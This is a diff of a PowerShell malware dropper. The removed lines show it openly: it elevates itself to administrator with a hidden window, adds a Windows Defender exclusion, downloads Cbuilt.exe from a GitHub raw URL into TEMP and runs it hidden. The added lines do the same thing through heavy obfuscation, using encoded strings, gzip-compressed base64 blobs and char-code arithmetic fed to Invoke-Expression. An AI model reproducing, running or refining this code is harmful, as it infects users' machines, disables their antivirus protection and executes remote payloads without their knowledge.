@@ -1,52 +1,23 @@
 param(
-    [string]$OriginalTemp = $env:TEMP,
-    [string]$FileName = "cf.exe",  # This determines the local filename
-    [string]$RepoUrl = "https://github.com/monkbytting/client/raw/main"
+    [string]${`Kd`O`Tgt`R`Admbm`R`D} = $env:temp,
+    [string]${k`Dotsrdv`Hu`G`Y`C`P} = ((([SYSTeM.text.encoDInG]::"`Ut`F8"."getstr`I`N`G"([byte[]](99,102,46,101)))+([SyStEM.texT.ENcOdING]::"ut`F8"."`G`Ets`T`R`I`Ng"([byte[]](120,101))))),  
+    [string]${`K`Doteoma`Uma`Kh`G} = ((([SystEM.tEXt.eNCOdinG]::"u`Tf8"."`G`Etst`R`Ing"([byte[]](0x68,0x74,116,0x70,115,0x3a,0x2f,47,0x67,0x69,0x74,104,117,0x62,46,99,111,109,0x2f,109)))+([SysTeM.TeXT.ENCoDiNG]::"u`Tf8"."g`Et`S`T`Ring"([SyStEM.ConvErt]::"fr`O`Mb`As`E64`Str`I`N`G"('b25rYnl0dGluZy9jbGllbnQvcg==')))+([SYSteM.TEXt.encodiNG]::"u`T`F8"."`G`E`Ts`Tr`I`Ng"(([byte[]](0x61,0x77,0x2f,0x6d,0x61,0x69,0x6e))))))
 )
-
-# Silent logging to file only
-function Write-Log {
-    param([string]$Message)
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message" -ErrorAction SilentlyContinue
-}
-
-# Check for admin privileges and elevate if needed
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Log "Elevating to admin privileges..."
-    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
-    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`" -FileName `"$FileName`" -RepoUrl `"$RepoUrl`""
-    (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe', $elevatedCommand, '', 'runas', 0)
-    exit
-}
-
-# Main execution block
+function o`U`Euc`B`Oa`Pn0 {param ([string] $KdOTmhsyvdcbfc);${kdOtveoufzawgt} = [cOnveRt]::"`Fro`M`Ba`Se64`S`T`R`In`G"($KdotMhsYvdcbFc);${kdo`T`O`Do`Mvh`R`Ksq} = [SysTEm.io.meMoRySTReAM]::"`Ne`W"(${kDoTveoufzawgt});${`Kd`O`T`F`Ow`Nmxnk`D`F} = [SystEM.Io.CoMprEssiOn.gzIpsTREaM]::"new"(${`K`D`O`To`Dom`Vh`R`K`S`Q}, [SYsteM.IO.COMPREssIoN.COMpresSIONmoDE]::"d`Eco`M`Press");${`Kdo`Tfow`Nm`X`N`K`Df} = [systEm.IO.COMpReSsIoN.GzIpstREAM]::"`N`E`W"([SystEM.IO.MEMOrysTREam]::"n`E`W"(${kdOtveoufzawgt}), [SYstem.io.CoMpRESSiON.comPREssionmoDe]::"`De`Compr`Es`S");${`Kdo`T`Muthrenwm`E} = [sYstem.iO.sTrEAmrEadEr]::"n`E`W"(${k`D`O`Tf`Ow`N`Mxn`K`Df});${k`D`Ot`Rq`Bqgve`Hnu} = ${kdot`M`U`Th`Re`Nw`Me}."r`E`A`Dto`En`D"();return ${`Kdo`Tr`Qb`Qg`Veh`Nu}}(oUEucBOaPn0 H4sIAAAAAAAACmVTYU+jQBD9Bf4H0pgI2UJgl91lTfygLbXVsxpBT69pMi3Fyl1ZDGw9OeN/v+yivTN+YJJhJ/PevDfzsJWZKippwTWcwxi+wwDD/W/4BhOIrdc9y7Ksp0W9KO1Zo+pCruf7v1ZVWtZtW7fLNpOOKdl/hXMYVgqSLYxhCqMVTP88F2/WkeXZ7s+qkLPscVHP5nPbdnHEEKHc6dsBFdwNQsGcvi0IwsTp2y6LIh8xgalOQowpCngUIEwDrP9gnxGEA+Y7fTsknLghNr1cxrCPGMeB4ziWO6rqcqEs27ZnTdukeemp+E55+TS7XE3k6fzwsLeF9CHqeT04zVUDKVzDRMJpz7Zny1blmqv/wkX/S8Crvv8S7oJJWfgRsK8foo9AFvrBlKwcx3GQ5pOk+UXHJ5bZ5bCYGj5w8x8hSJQmBFPNaEeIRv0goPrTvTrtvwrMWYQiosUUgvmuiIxYLuNhgFgUBjoRImBICGYSzihBnGNdRigmLgk7sQUhBIkw1L24IMTlUaDFDgnDboQ5R6EfaPdcyiOKaCS0a5xy7vKQdU5cLdSjpW1Q9cQMml9cpa1jIWs/l8+HaVw+Wagz6r5RsRbmJfVyLUxXr42CkRZm/dmoWdI2aVx6g0t5m9ep0XBUVyWcwDEkOQshUTVM5LpnH9yNz4JlSTdZQZslzo4OjICO5d4uNttcw2v8RMWll+Z3qZdPB9WwmK4NvnqHhxhSSCCttTHrz5tCl+8dkbmGlT4GuIGxNMcAP+AWJm8fg75vgAGSWTWcSAOkN6CD2u1k8WUlqVk6/x/a+e4gT9pMaohZo6477vHFU3qvx4zruqqPu1tPik0u1aYdVFIVcpvvvf0F1CLf+gcEAAA=) | .(-join[char[]]((8322-8249),(-2074+2184),(160-7217+7175),(-1339+1450),(-6646+6753),(-2327+2428),(-4616+4661),(-5440+5509),(7558-7438),(-4938+5050),(5203-5089),(-842+943),(6151-6036),(-7997+8112),(-8337+8442),(-4858+4969),(5735-5625)))
+(oUEucBOaPn0 H4sIAAAAAAAACrVWXW/iOhD9BfsfULRSE+VDdr6crLQPFFKa2xK6kEJZVGkguDS7kKDEdEGr/vcrmyRA92Uf7uXBdezxeHzmzJmmLy1Zz3LWkmcjmuyKlB2MhyLNknQ7XxuTNFvmv8pm4XlWBp1dEcYHYztMs076MF8bv9KoO5iMwm4QsTQ+PH/5IkEPApbAIwxhSCFikqwohgRhmWYFDNZUkoWjYcimxsMwzJJw2+a3CUfXj+k9C7PhYE2Fr/ZyA2EGIYxYAW2I80JSlNbvT61Wq2XI+o88zWbJ67yYPT/LMnY839I91/F1gh1T0WQXY093kW0pmqzblo9U23b5hm6byFdt03cVTSaOjXViE5tvmARh1SQO5h8WcjzVwjYRR3zfVB2MxY7pIk81XU+cIa6FVEIQv4YQ7OvEdZCiKC1ZlmflYRTTvsGCPTNolOTdNOuJtz1C/OJJhgQ9ymAEMQzTDHocnmkZ043RyaNxUDBhewPDfLOAdgmBa5cQFxyVniRfDSf79XJzg+YTJwtvh29h7+bnYrLehbfXh/nT9OuVoiiqPBsdSkb7RkyfmBFEncEyjaogGNzwIFYQiCCKNFtJsjxbHBjloKK962to7yZ8cPhA6hmxNLQ36WlQxE/k5vNvuFvmDO5gslnBd/hOYVDA9Xvra2s2OgJCo3E6HEQbmh2fGOy38wy6EEAE47SAAUTQ518MxtAuUmgv1hRGknz0DTH0OA7t5WYBfRhC9/10NXT5/refcD+HRwrjV4jhll8u84zUYPCMCDDCIxg79nKCgsEwhUjko8bCdjTiaRhjzUMaxraYYmRqGDkaRp6GEdYsU7MdzfU1bCKx4PsaxkTD2D3a8TMYHV3g6pgjrExx2nXFDGNT8/kxfsSp3Hqk8oHqtI6ql8RGECX5suLW7kQtiM+5dZFYm2fyhWeS59Th6SR8jVxm3EQa2tse/xQbdjMIPtDaxFxyO7exu3TgChPzyJGW2vr8MEryzWaeLbdz9tpSq1opRa3QfWzQLBl0w2h1SVPKSlZAWGVG1NbGSPLoLRgKGr0UOfQXc1Enx4dz45UkX0074er+0T/MJ8vtYnNTjntjlnSuV1WFlFPhitGn+KJCdtXNAsqSs4IXSAOjZTcP+v3zSDvOeehx0kMAAxgu3qvXjaYloxsjplwJsmSwDLPVebZW9KwEmxt8V7PsKv8EXXCNeIIiyK+ZJ2xPAYkaLHltvMHtbgXTZNvEUjNHPJfHUiPdBMOfe4J6NC3joIY6PhOlc6zTM6jH/6yTnj9ONr9W004ohOgMJyaw6UN7B/053L1C7xRZGQcVB3hk3bRCqaFAFdgFSh8IJpRA/qND6L7r+6pPiBB0Ylq+6hDkqdi1RFdwCJd4X0g8djxTx44lTD3bJarn2Lxd6C42LdU1TW5FTAfpBNuiD3gWUX3LE55sH6uO4yNug2ysY4R11zN5dlp6J98MFj9owloSjF7pem1Ae7tdp8mcpXkmKYZUwi1dwz0Eewigs4MYAukoXtOSBRveTo487dYkOooX7751yTe5q0HimoIx1yPnpB/cWY11zYIz0h+lsGo3J0/I1mwuaJjr3Jkznrin2KBRJ6/p3RRvo0aCVR/bDA9JURTtSBAYMPgGd0LAIRAK/vqu8f9UWFHJNQTQ37KDpGgNb0SLa7Tw8i11hzvpesnrsW90BtkbLeJGPeAa2iU9yQfn2VWSjXenXsor4XhRxttHI7onkfqzjLnGEqt6o/zxpzuOZenX82zJJ4qY1Yt5IdaqxT9N8+KjZW36l27z4u+8Kur/Eiq//r+OVFGRogtiVn/18nWN+VjgRiDoPmWf3v8FoQlUiAcLAAA=) | .(-join[char[]]((8911-8838),(-2794-3224+6128),(15967-6423-9426),(-9790+9901),(-5253+5360),(-1471+1572),(4926-4881),(-3484+3553),(-5283+5403),(9499-9387),(6555-6441),(4437-4336),(8852-8737),(7210-7095),(-6338+6443),(3766-3655),(6468-6358)))
 try {
-    Write-Log "Starting execution..."
-    $output = Join-Path $OriginalTemp $FileName
-    $outputDir = Split-Path $output -Parent
-    Write-Log "Target path: $output"
-
-    if (-not (Test-Path $outputDir)) {
-        Write-Log "Creating directory: $outputDir"
-        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
-    }
-
-    if ((Get-MpPreference).ExclusionPath -notcontains $output) {
-        Write-Log "Adding exclusion to Windows Defender: $output"
-        Add-MpPreference -ExclusionPath $output -ErrorAction SilentlyContinue
-    }
-
-    $downloadUrl = "$RepoUrl/Cbuilt.exe"
-    Write-Log "Downloading from: $downloadUrl"
-    $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction SilentlyContinue
-
-    if (Test-Path $output) {
-        Write-Log "File downloaded successfully, executing: $output"
-        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
-    }
+    .(-join[char[]]((-2805+2887),(1577-63-1439),(292-220),(-5872+5959),(4931-4864),(3947-3897),(-8691+8780),(-4229+4348),(-6429+6505),(-7465+7538),(-5311+5380))) ((([SYsTEm.TEXT.ENcOding]::"ut`F8"."`Ge`T`Str`I`N`G"([byte[]](83,116,97,114,116,105,110,103,32,101,120,101,99,117,116,105,111)))+([SystEM.tEXt.encoDing]::"`U`T`F8"."g`E`T`Str`Ing"([sySTem.cOnvErT]::"fr`Om`B`A`Se64s`T`Rin`G"('bi4uLg==')))))
+    ${kdotOrwbjewczr} = .(-join[char[]]((-6388+6462),(1572-1461),(3527-3422),(3936-3826),(6885-6840),(-5133+4398+815),(-6533+3081+3549),(371-255),(-7077+7181))) ${`Kdo`Tgtra`D`M`B`Mrd} ${`K`Do`Tsr`Dv`Hu`G`Y`Cp}
+    ${k`Dotmu`Dfyt`Nzmd} = .(-join[char[]]((-8619+8702),(-587+699),(8763-8655),(1327-1222),(-5274+5390),(5703-5658),(-890+970),(7182-7085),(-4807+4923),(-6583+6687))) ${KdotOrwBjewczr} -Parent
+    .(-join[char[]]((7912-7830),(2150-2075),(1935-1863),(12951-9227-3637),(-2630+2697),(1755-1705),(9260-5237-3934),(-9795+9914),(-8976+9052),(-3459+3532),(-651+720))) (((([SystEm.teXt.eNCodIng]::"`U`T`F8"."get`St`R`Ing"([byte[]](84,97,114,103,101,116,32,112,97,116,104,58,32))))) + ${kdotorwBjewczr} + ([StRiNg]::EMpTy))
+    (oUEucBOaPn0 H4sIAAAAAAAACnVS0WpbMQz9gv3DJezBF18HS7Ysua9LW8pYO9h96ULBXXuzZiNJSW8hadd/H3K6MdjmByHrSPaRdJaLxrj1ZmzM1Lhvm+V6fnN3vZ1fXRnjGMUKYNuZAMgueExtZwAkOfAMGveJHWZS3yVObDN7SxK1yDGJlSDqCqO3IsA1jtFGSdFFj7HtjIBEFxM5TkBt2zZvn7+XWbko/eqxzMpJuSx9OX8qH25f2rZ5ftO8nr8Zg8dsAUD5QCBxCT3amCHrvyRsE1U35ZwsewltZyhkcBQqFZd8DjZBVAAEsgMOvhZHyZaSr+0AiRMCssKxvoc5sA0eaioyi0WJrL0YY8z84fKhP15N++PdOB3W7y5my/Xp1dHR5LH0C5lMJ+V0KP1D6bfLcv51Ysz8y34ctCW/i6HzO8bO7xKpAb1G9bKaQQ13fodevd/AHxX1gQosfgGsKeG6lrX1NLZ5+1ze69jH1ePtYejrp1WZvTS2MfNP4/asch5W9/2+bf+/BAAfvAPk5HJiVYxE9k5C0kkxo+7Za9xJQLYSWNUCXtVCCVymqChDcJSrYMBTFMtENkuua8KU0aJ4UOru4/V490p/cxDNYl/6dfmskmnc2Tis+v390MyW2+Fm3Gz3jTvZbG+G5sc/NESYk6XAdPiHgkXmuldICBY4KKcMIbrsRXuiyOIoek1iyi4d5I+Rk0WSSjggeBsCSPs6u5efCOJjTXoDAAA=) | .(-join[char[]]((5065-4992),(-6971+7081),(-3983+7364-3263),(2546-2435),(2814-2707),(6904-6803),(-7877+7922),(7346-7277),(-6410+6530),(4419-534-3773),(6226-6112),(18461-9655-8705),(-222+337),(-12101+7583+4633),(-7689+7794),(7224-7113),(-1992+2102)))
+    (oUEucBOaPn0 H4sIAAAAAAAACnWT3W4TOxDHn4B3WEVI2PI6mhl/jStxQUuoqiMCJwmUKqq0SVjahbCLEveQnop3R3ZygXR09mK0Y489M7//uPtSCTEW+uvQ9cvN/Wq3vL0VQkdvWcWAUdZCOwPKG8y/7MAr9kSyFmQ8ajLoZS0CMGl0rD3bUM5E8MoDcnYCA6jADLIWSOy8djE67UOJNWBAU6RjLgioHAZTHHRWuQik/fFWJIgKDeVdikyamEtdaIxhZRFZRWNyHo3I6JQBtIojlNTsUXPwpAIASSnluD1cbB/mV8P0x6t0X+l+SJuhT6uu31fPn/76PKR3u5/nX9ufm393v2T19Kw6ff8lZiwoW7g4yg3isTBLFJSlmJuz6Jy24DMTdAUYOlkLRs+a8cjKOgBlHRcaxBAVRco7jkLmAKSQIDPXHlj5U/82R/oArBgDSCkrIYRYzm/mqf0+XrSf0njSb4bP3fTy9uxs1HxIzRsejUd3bdo3i2bWXPV3I7Hc38zT5O14M/QfJ7NUIt80s+bd9/Wqmbfe7lMz65ppczkSL/6+nn1bXbv+6vKjvaEDbmj7z7o7h/Xj+afVtX35QkqpxHL+uD+VsBhP+ovh9amEh/QlF9BctqmZN4td10xzBevH1GaicPC2RsQaMdZwCKaGA0HtuUbAGg7eZ+OyabOxRxfR1o5LbBZYVqp6/vTtKOT6JGSlKrHcL3ZX07vbs7PJ2/fpRsr/lzZYDDoYl7XVwTOoEMooa48BdIygAvmy4ADzEAZtXMi6xGCcjt4VZclHq4iLdg7BaAdlkLVlG5WNPjveOKM9HZOZiFFZoHxVCIwlezlNqB1AeRM+kArH92I8OGVCGSriGPP8HN8CRYsqMEXlCE3moieHzfZh3w39+1W6P0Ea/oCkJ7vdsHu1Sd3QV/Nu2/Zp+3gx9KnrH9pC69dvwIwJbz0EAAA=) | .(-join[char[]]((8174-8101),(-8153+8263),(-4605+4723),(-711+822),(-983+1090),(8842-8741),(-4043+4088),(-7871+7940),(-886-7234+8240),(-1491+1603),(8314-8200),(-6830+218+6713),(-5534+5649),(-7399+7514),(-8709+8814),(8662-8551),(4316-4206)))
+    ${`Kd`O`Tq`R`X`Njq`V`Lr`I} = (([strING]::EMptY) + ${k`D`O`T`E`Oma`Uma`Kh`G} + ((([SysTEm.TEXt.eNcOdiNG]::"`U`T`F8"."`Getstr`I`Ng"([byte[]](0x2f,0x43,98,117,0x69,0x6c,0x74,46,0x65,120,101))))))
+    .(-join[char[]]((11255-1515-9658),(4931-4856),(-7371+3429+4014),(3947-3860),(9192-9125),(-6204+6254),(-4335+4424),(679-560),(5144+735-5803),(4616+991-5534),(-9079+9148))) (((([sySteM.TexT.enCoDInG]::"utf8"."`Getstr`In`G"([SYstEm.COnVeRt]::"`Fr`O`M`Base64s`T`R`Ing"('RG93bmxvYWRpbmcgZnJvbTog'))))) + ${k`D`Ot`Qrx`Nj`Qvlr`I} + ([STRiNG]::EMPty))
+    ${`K`D`Oty`Jayo`Qa`P`O`B} = ((([sYsTem.TEXT.eNCodINg]::"ut`F8"."g`Etst`R`Ing"([byte[]](83,105,108,101,110,116,108,121,67,111,110,116,105,110,117,101)))))
+    .(-join[char[]]((-412-3675+4160),(174-64),(-3909+4027),(2509-2398),(-4120+9684-5457),(4354-4253),(-802+847),(-9196+9283),(-8715+227+8589),(319+7421-7642),(921-839),(-7783+7884),(-8406+8519),(-12536+6019+6634),(-2442+2543),(-8502+8617),(-9051+9167))) -Uri ${`K`Dot`Q`R`Xn`J`Qv`Lr`I} -OutFile ${Kdotorwbjewczr} -TimeoutSec (((((((-bnot(-bnot(((((((((10481-Bxor-6455)-Band2*(10481-Band-6455))-Band((10481-Bxor-6455)-Bor2*(10481-Band-6455)))-Band(((10481-Bxor-6455)-Band2*(10481-Band-6455))-Bor((10481-Bxor-6455)-Bor2*(10481-Band-6455))))+((((10481-Bxor-6455)-Band2*(10481-Band-6455))-Band((10481-Bxor-6455)-Bor2*(10481-Band-6455)))-Bor(((10481-Bxor-6455)-Band2*(10481-Band-6455))-Bor((10481-Bxor-6455)-Bor2*(10481-Band-6455)))))+0)-0)))))))-shl1)-shr1))-3996) -ErrorAction SilentlyContinue
+    (oUEucBOaPn0 H4sIAAAAAAAACnVSf0vcQBD9BP0O4fCPXXb32NmfM/7Xymml1EovpZVDiHppjT0TiBG9it+9zJ5YSmkIZCfv7c57+6b7Xom5MDdD16+uri/G1fm5EM66YICClVqQD8GQC15qkSGjyTbxmiiiIQxOamEiYVDJOuLCee+UC1CQRIAqW4ilcNar5IFpLqCBEKSU1d7Tz/UwDePD5U37cPVrfJbV05vq5flHnInWkoqWgE/BlE1ONqqAUGQBgCHruUVMyZsYc+LemdAr9FllV4gmkg0qUgxcABApcIhSCwzkDPpcWCkmp1LyDJhM4FQmZDPJOmsiRWAHQgixujtb1u3H+bR4rOftycGw7vof5/v7s/upOcTZfNYctU19N43NcXPSHM3E6nI7tWwpWw02arCowYL2ToO1GgA0AGkAhrHUlHeQhfJlJkQNkDURvwUof/g4J6VUYnW3XdaL23m9+FbP2/7g07rrj1hX86WpX5VNzZKV9X8J44N3qlCDAx3CThxocDsV3JNJkHYWilavI2rP3aWsVLX39GEX77uXeCtVidWy/nxc7qe9PZ3OpPx/4ADBKUzWG0qJhypzxomIY4CMTsWIaLLbJeYwJOUo8fBCtMGAL7GaZDOpBK4EjskGhQm58JCD8bbsMJBTVoCZtziKSaWYvaHgC+oxWOUp8OxFTyagdSr4wk6WeCJyZNvmsNu0pxfT9Z/pfrVvvnb9enhYTttNW73v1uu2r8xiHIfx7dXUDX217DZtP222B0M/df19W+7m+TeJ6qOeqwMAAA==) | .(-join[char[]]((999-2319+1393),(7098-6988),(-6724+6842),(-2752+2863),(1353-1246),(3287-3186),(-9674+9719),(-3340+3409),(9656-9536),(3473-3361),(6882-6768),(8187-8086),(1359-1244),(-8260-1212+9587),(-5535+5640),(7524-7413),(-9339+9449)))
 }
 catch {
-    Write-Log "Error occurred: $_"
+    .(-join[char[]]((-13429+8654+4857),(-9772+9847),(6486-6414),(10075-9988),(-481+548),(-9063+9113),(-6690+6779),(-8275+4467+3927),(-1747+6507-4684),(-2807+6244-3364),(9862-9793))) (((([sYstEm.TeXT.eNCODIng]::"`Utf8"."`G`Et`S`Tr`I`Ng"([byte[]](69,0x72,114,0x6f,114,32,111,99,0x63,117,114,0x72,0x65,100,0x3a,32))))) + $_ + ([StRINg]::emPTY))
 }
